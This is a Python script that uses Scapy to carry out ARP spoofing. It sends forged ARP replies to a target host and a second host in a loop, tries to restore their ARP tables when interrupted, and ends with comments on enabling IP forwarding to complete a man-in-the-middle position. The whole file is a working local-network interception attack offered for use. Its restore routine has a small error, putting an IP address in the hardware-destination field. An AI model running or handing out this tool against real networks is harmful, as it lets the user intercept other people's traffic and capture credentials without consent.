import time
import sys

import scapy.all as scapy

# cmd input parameter

import optparse




def get_Arguments():
    parser = optparse.OptionParser()
    parser.add_option("--target_ip",dest = "target_ip",help = "Please read documention")
    parser.add_option("--spoof_ip",dest = "spoof_ip",help = "Please read documention")
    (options,arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify target_ip or try to help by using help command")
    elif not options.spoof_ip:
        parser.error("Please specify spoof_ip or read documentation")
    else:
        return options;


def getMac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadCast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        arp_broadCast = broadCast/arp_request
        answered_list = scapy.srp(arp_broadCast,timeout = 1,verbose = False)[0]


        return (answered_list[0][1].hwsrc)
    except IndexError :
        print("Please check the target again")



def restore(src_ip,des_ip):
    src_mac = getMac(src_ip)
    des_mac = getMac(des_ip)

    packet = scapy.ARP(op=2,pdst = des_ip,hwdst=des_ip,psrc=src_ip,hwsrc = src_mac)
    scapy.send(packet, verbose=False)
def spoof(target_ip , spoof_ip):
    # pdst --> IP address of the target
    # hwdst --> MAC Address of the target
    # psrc --> IP address of the attacker
    target_mac = getMac(target_ip)

    packet = scapy.ARP(op=2,pdst= target_ip,hwdst = target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)


options = get_Arguments()

packetcounter = 0
try:
    while(1):

        spoof(options.target_ip,options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        packetcounter = packetcounter + 2
        sys.stdout.write(f" \r Packet sent:{str(packetcounter)}")
        time.sleep(2)
       
except KeyboardInterrupt:
    print("Detected Control C .... Quiting program")
    restore(options.target_ip,options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
    print("Restoring the data change reverted successful")

# to forward the port use sudo echo 1 > /proc/sys/net/ipv4/ip forward
# sysctl net.ipv4.ip_forward=1